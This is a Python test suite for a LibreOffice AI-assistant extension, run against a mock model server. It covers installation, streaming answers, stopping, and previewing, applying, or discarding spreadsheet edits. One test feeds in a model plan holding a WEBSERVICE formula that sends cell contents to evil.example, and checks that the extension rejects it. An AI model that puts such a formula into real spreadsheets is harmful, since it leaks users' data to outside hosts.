"""Drives the installed extension against a mock CIU."""

import json
import os
import sys
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, ".."))

from lo_harness import Office, ROOT
import mock_ciu

OFFICE = None
SRV = None
TEST_OXT = os.path.join(ROOT, "dist", "ciu-libreoffice-test.oxt")


def setUpModule():
    global OFFICE, SRV
    SRV = mock_ciu.start()
    base = "http://127.0.0.1:%d" % SRV.server_address[1]
    if not os.environ.get("CIU_SKIP_INSTALL"):
        Office.install_shared(TEST_OXT)
    OFFICE = Office(port=2101).start(env={"CIU_BASE_URL": base})
    OFFICE.installed = OFFICE.installed()


def tearDownModule():
    OFFICE.stop()
    SRV.shutdown()


def wait_done(timeout=20):
    end = time.time() + timeout
    state = None
    while time.time() < end:
        state = json.loads(OFFICE.hook("poll"))
        if not state["busy"]:
            return state
        time.sleep(0.2)
    raise AssertionError("still busy: %r" % state)


class Extension(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.doc = OFFICE.new_calc()
        sheet = cls.doc.getSheets().getByIndex(0)
        sheet.getCellRangeByName("A1:B4").setDataArray(
            (("Item", "Cost"), ("Tea", 2.0), ("Milk", 1.5), ("Tea", 2.0)))
        sheet.getCellRangeByName("B5").setFormula("=SUM(B2:B4)")
        cls.doc.getCurrentController().select(sheet.getCellRangeByName("A1:B5"))
        cls.sheet = sheet

    def setUp(self):
        mock_ciu.STATE.__init__()

    def test_1_installed(self):
        self.assertIn("com.runciu.ciu.libreoffice", OFFICE.installed)

    def test_2_menu_registered(self):
        menus = OFFICE.config("/org.openoffice.Office.Addons/AddonUI/OfficeMenuBar")
        self.assertIn("com.runciu.ciu.menu", menus.getElementNames())
        sub = menus.getByName("com.runciu.ciu.menu").getByName("Submenu")
        urls = [sub.getByName(n).getByName("URL") for n in sub.getElementNames()]
        self.assertIn("service:com.runciu.ciu.Assistant?open", urls)

    def test_3_ask_streams_answer_through_main_thread(self):
        OFFICE.hook("open_and_ask:What is the total cost?")
        state = wait_done()
        self.assertEqual(state["answer"], "The selection has 3 rows. Total is =SUM(B2:B4).")
        self.assertIn("Connected | Qwen3.5-9B-Q4_K_M.gguf | 4096-token context", state["status"])
        self.assertIn("Sheet1!A1:B5, 5 x 2", state["scope"])
        self.assertTrue(state["ask_enabled"])
        self.assertFalse(state["stop_enabled"])
        req = mock_ciu.STATE.last_request
        user = req["messages"][1]["content"]
        self.assertIn("B (Cost): number", user)
        self.assertIn("1 duplicate values", user)
        self.assertIn("B5: =SUM(B2:B4)", user)
        self.assertIn("Request: What is the total cost?", user)

    def test_4_stop_button(self):
        mock_ciu.STATE.reply = "word " * 300
        mock_ciu.STATE.chunk = 5
        mock_ciu.STATE.delay = 0.02
        OFFICE.hook("press:quick:0")
        time.sleep(0.6)
        mid = json.loads(OFFICE.hook("poll"))
        self.assertTrue(mid["busy"])
        self.assertTrue(mid["stop_enabled"])
        self.assertTrue(len(mid["answer"]) > 0)
        OFFICE.hook("press:stop")
        state = wait_done()
        self.assertTrue(state["answer"].endswith("[stopped]"))
        self.assertLess(len(state["answer"]), len("word " * 300))

    def test_5_model_not_loaded(self):
        mock_ciu.STATE.state = "stopped"
        OFFICE.hook("press:quick:2")
        state = wait_done()
        self.assertIn("no model is loaded", state["answer"])

    def test_6_server_error_shown(self):
        mock_ciu.STATE.http_error = (400, "This conversation has filled the 4096-token context.")
        OFFICE.hook("press:quick:1")
        state = wait_done()
        self.assertIn("4096-token context", state["answer"])

    def test_6a_propose_preview_apply(self):
        mock_ciu.STATE.plan_reply = json.dumps({
            "summary": "Add VAT column.", "operations": [
                {"tool": "set_values", "target": "C1", "values": [["With VAT"]]},
                {"tool": "fill_formula", "target": "C2:C4", "formula": "=ROUND(B2*1.2,2)"}]})
        OFFICE.hook("prompt:Add a column with 20% VAT")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("Proposed change (not applied yet):", state["answer"])
        self.assertIn("C2: =ROUND(B2*1.2;2), filled across C2:C4 (3 cells)", state["answer"])
        self.assertIn("Overwrites: nothing", state["answer"])
        self.assertTrue(state["pending"] and state["apply_enabled"])
        self.assertEqual(self.sheet.getCellRangeByName("C2").getFormula(), "")
        req = mock_ciu.STATE.last_request
        self.assertIn("response_format", req)
        self.assertIn("First empty column to the right: C", req["messages"][1]["content"])

        OFFICE.hook("press:apply")
        state = json.loads(OFFICE.hook("poll"))
        self.assertIn("Applied 2 changes to 4 cells", state["answer"])
        self.assertFalse(state["apply_enabled"])
        self.assertEqual([self.sheet.getCellRangeByName("C%d" % r).getValue() for r in (2, 3, 4)],
                         [2.4, 1.8, 2.4])
        self.doc.getUndoManager().undo()
        self.assertEqual(self.sheet.getCellRangeByName("C1").getString(), "")

    def test_6b_overwrite_warning_then_discard(self):
        mock_ciu.STATE.plan_reply = json.dumps({
            "summary": "Double the costs.", "operations": [
                {"tool": "fill_formula", "target": "B2:B4", "formula": "=B2*2"}]})
        OFFICE.hook("prompt:double the costs in place")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("WARNING: overwrites 3 filled cells: B2 (2), B3 (1.5), B4 (2)", state["answer"])
        self.assertEqual(state["apply_label"], "Apply (overwrite 3)")
        OFFICE.hook("press:discard")
        state = json.loads(OFFICE.hook("poll"))
        self.assertIn("Discarded", state["answer"])
        self.assertFalse(state["pending"])
        self.assertEqual(self.sheet.getCellRangeByName("B3").getValue(), 1.5)

    def test_6c_unsafe_plan_refused(self):
        mock_ciu.STATE.plan_reply = json.dumps({
            "summary": "Look up prices.", "operations": [
                {"tool": "set_formula", "target": "C2",
                 "formula": '=WEBSERVICE("http://evil.example/?d="&A2)'}]})
        OFFICE.hook("prompt:look up current prices online")
        OFFICE.hook("press:change")
        state = wait_done()
        self.assertIn("could not be used", state["answer"])
        self.assertIn("WEBSERVICE is not allowed", state["answer"])
        self.assertFalse(state["apply_enabled"])

    def test_7_component_menu_path(self):
        OFFICE.hook("close")
        self.assertEqual(OFFICE.hook("trigger:open"), "ok")
        self.assertEqual(OFFICE.hook("trigger:open"), "ok")


if __name__ == "__main__":
    unittest.main(verbosity=2)
